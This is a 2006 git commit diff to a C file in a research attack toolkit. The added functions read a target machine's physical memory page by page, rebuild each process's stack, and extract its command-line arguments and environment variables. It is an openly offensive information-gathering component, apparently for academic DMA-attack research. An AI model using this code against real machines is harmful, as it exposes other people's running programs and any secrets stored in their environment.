b83e9d3a3967446499935ad00e3c743d0d4ddef3
David R. Piegdon <dgit@piegdon.de>
2006-11-28 02:22:19 +0000

    writing remote process info-gathering function.
    git-svn-id: file:///home/dpiegdon/repositories/subversion/SEAT1394/trunk@170 e86586aa-b51f-0410-b3e5-995dd3868ebd

--- attacks/userspace/remote-ps.c
+++ attacks/userspace/remote-ps.c
@@ -19,6 +19,8 @@
  */
 
 #define _LARGEFILE64_SOURCE
+// required for memmem:
+#define _GNU_SOURCE
 
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -26,51 +28,204 @@
 #include <unistd.h>
 #include <stdio.h>
 #include <errno.h>
+#include <string.h>
 
 #include <physical.h>
 #include <linear.h>
+#include <endian_swap.h>
 
 char pagedir[4096];
 
 #define NODE_OFFSET     0xffc0
 
-void print_process_name(linear_handle h)
+void dump_page(FILE* f,uint32_t pn, char* page)
+{{{
+	uint32_t addr;
+	int i,j;
+	char c;
+	fprintf(f, "dump page %x\n", pn);
+
+	addr = pn * 4096;
+	for(i = 0; i<4096; i+=16) {
+		fprintf(f, "page 0x%05x, addr 0x%08x: ", pn, addr+i);
+		for(j = 0; j < 16; j++) {
+			fprintf(f, "%02hhx ", (page+i)[j]);
+			if((j+1)%4 == 0 && j)
+				fputc(' ',f);
+		}
+		fprintf(f,"  |  ");
+		for(j = 0; j < 16; j++) {
+			c = (page+i)[j];
+			if(c < 0x20)
+				c = '.';
+			if(c >= 0x7f)
+				c = '.';
+			fputc(c,f);
+		}
+		fprintf(f,"\n");
+	}
+}}}
+///////////////////////////////////////////////////////////////////////////////
+
+// on linux, the max environment and argument is limited by PAGESIZE * MAX_ARG_PAGES
+// MAX_ARG_PAGES is 32 (statically defined in include/linux/binfmts.h)
+// so we will read 32 pages of the stack (if there are that many)
+#define MAX_ARG_PAGES 32
+
+#define STRING_SEEK_START(p) { if(*p) {while(*p) p--; p++;} }
+
+#define REMOTE_TO_LOCAL(r,lbase)	((char*) (lbase + ((uint32_t)r) - (AGENT_START << 12)) )
+#define LOCAL_TO_REMOTE(l,lbase)	((char*) (l - lbase + (AGENT_START << 12)) )
+
+int proc_info(linear_handle h, int *arg_c, char ***arg_v, int *env_c, char ***env_v, char **bin)
 {
+	static char stack[4096*MAX_ARG_PAGES];
 	addr_t pn;
-	addr_t padr;
-	char* page;
-	page = malloc(4096);
-	int valid_page = 0;
+	addr_t stack_bottom_page;
+	char *p;
+	int valid_page;
+	int i;
+	char *argv0p;
+	char **argv; int argc; char **largv;
+	char **envv; int envc; char **lenvv;
 
+	// seek stack-bottom
 	pn = 0xbffff;
-
+	valid_page = 0;
 	while(!valid_page && pn >= 0xbf000) {
-		if(linear_to_physical(h, pn*4096, &padr)) {
+		if(linear_to_physical(h, pn*4096, &stack_bottom_page)) {
 			// page is not mapped
+			pn--;
 		} else {
 			// found stack bottom
 			valid_page = 1;
-
-			printf("  |  lin. page 0x%05x -> phys. page 0x%05x", (uint32_t)pn, (uint32_t)padr >> 12);
-			if(linear_read_page(h, pn, page))
-				printf("UNREADABLE PAGE");
-			else {
-				char* p = page + 4096 - 1;
-
-				// in stack: seek process name
-				while(*p == 0)
-					p--;
-				while(*p != 0)
-					p--;
-				p++;
-				printf("  |  process: %s", p);
-			}
 		}
-		pn--;
+	}
+	if(!valid_page) {
+		// there was no stack...
+		printf("(no stack found)");
+		return 0;
+	}
+	stack_bottom_page = pn;
+
+	// obtain stack
+	if(linear_read_page(h, stack_bottom_page, stack+4096*(MAX_ARG_PAGES-1))) {
+		// the stack bottom was not readable...
+		printf("(stackbottom (@0x%08llx) unreadable.)", stack_bottom_page);
+		return 0;
+	}
+	// now read the following pages
+	bzero(stack,4096*(MAX_ARG_PAGES-1));
+	// page "0" was read above.
+	for(i = 1; i < MAX_ARG_PAGES; i++)
+		if(linear_read_page(h, stack_bottom_page - i, stack + 4096 * (MAX_ARG_PAGES-(i+1))))
+			break;
+
+//for(i = 0; i < MAX_ARG_PAGES; i++)
+//	dump_page(stdout, stack_bottom_page - (MAX_ARG_PAGES-1) + i, stack+4096*(i));
+
+	// find name of binary
+	p = stack + 4096*MAX_ARG_PAGES - 6;
+	STRING_SEEK_START(p);
+	*bin = p;
+
+	// now walk backwards until we find two consequtive NUL-chars.
+	// this marks the beginning of args, env and name of binary.
+	// point to the first non-NUL-char, that is argv[0]
+	while (*(p-1) || *(p-2))
+		p--;
+	// this is the address of argv[0]
+	argv0p = (char*)((uint32_t)(p - stack) + (((uint32_t)stack_bottom_page - MAX_ARG_PAGES + 1) * 4096));
+#ifdef __BIG_ENDIAN__
+	argv0p = (char*)endian_swap32((uint32_t)argv0p);
+#endif
+
+	// now find the address of argv[0] in the stack;
+	// that would be argv[] then.
+	// we need to search the LAST hit on the stack, as the program itself
+	// may have pushed a copy of the address onto the stack.
+	p = stack; argv = NULL;
+	while(p) {
+		argv = (char**)p;
+		p = memmem(p+1, MAX_ARG_PAGES * 4096 - (p-stack), &argv0p, 4);
+	}
+	if(!argv) {
+		printf("(did not find argv[] on stack of \"%s\")", *bin);
+		return 0;
+	}
+	// argc is stored right before argv[]
+	argc = *((uint32_t*)(argv - 1));
+#ifdef __BIG_ENDIAN__
+	argc = endian_swap32(argc);
+#endif
+	if(argc > 32768) {
+		// oops... linux does not allow more than 32768 args...
+		printf("(more than 32768 args for \"%s\")", *bin);
+		return 0;
+	}
+	if(argc <= 0) {
+		// oops... a program never can have <1 argument,
+		// as argv[1] is the string by which it was execve()'d
+		printf("(no args or negative argc for \"%s\")", *bin);
+		return 0;
+	}
+	if(argv[argc]) {
+		printf("(last arg != 0) for \"%s\"", *bin);
+		return 0;
 	}
 
-	free(page);
+	// translate remote argv to local argv.
+	largv = malloc(sizeof(char*) * (argc+1));
+	largv[argc] = 0;
+	for(i = 0; i < argc; i++) {
+		// get address
+		if(argv[i]) {
+#ifdef __BIG_ENDIAN__
+			largv[i] = (char*)endian_swap32((uint32_t)argv[i]);
+#else
+			largv[i] = argv[i];
+#endif
+			// and transform it to a local address
+			largv[i] = (char*)(  (uint32_t)largv[i] - ((uint32_t)stack_bottom_page - MAX_ARG_PAGES + 1) * 4096 + (uint32_t)stack  );
+		} else {
+			largv[i] = NULL;
+		}
+	}
+
+	// count envv's size
+	envv = &(argv[argc+1]);
+	envc = 0;
+	while(envv[envc])
+		envc++;
+
+	// translate remote envv to local envv.
+	envv = &(argv[argc+1]);
+	lenvv = malloc(sizeof(char*) * (envc+1));
+	for(i = 0; i < envc; i++) {
+		// get address
+		if(envv[i]) {
+#ifdef __BIG_ENDIAN__
+			lenvv[i] = (char*)endian_swap32((uint32_t)envv[i]);
+#else
+			lenvv[i] = envv[i];
+#endif
+			// and transform it to a local address
+			lenvv[i] = (char*)( (uint32_t)lenvv[i] - ((uint32_t)stack_bottom_page - MAX_ARG_PAGES + 1) * 4096 + (uint32_t)stack  );
+		} else {
+			lenvv[i] = NULL;
+		}
+	}
+
+	*arg_c = argc;
+	*arg_v = largv;
+
+	*env_c = envc;
+	*env_v = lenvv;
+
+	return 1;
 }
+
+///////////////////////////////////////////////////////////////////////////////
 
 int main(int argc, char**argv)
 {
@@ -128,13 +283,26 @@ int main(int argc, char**argv)
 			physical_read_page(phy, pn, page);
 			prob = linear_is_pagedir_probability(lin, page);
 			if(prob > 0.01) {
-				printf("page 0x%05llx prob: %0.3f", pn, prob);
+				printf("page 0x%05llx prob: %0.3f ", pn, prob);
 				if(linear_set_new_pagedirectory(lin, page)) {
 					printf("\nloading pagedir failed\n");
 					continue;
 				}
-				print_process_name(lin);
-				printf("\n");
+
+				int argc, envc;
+				char **argv, **envv;
+				char *bin;
+				int i;
+
+				if(!proc_info(lin, &argc, &argv, &envc, &envv, &bin)) {
+					printf(" FAIL.\n");
+				} else {
+					printf("\t\t%20s\t\t", bin);
+
+					for(i = 0; i<argc; i++)
+						printf("%s ", argv[i]);
+					putchar('\n');
+				}
 			}
 		}
 	}
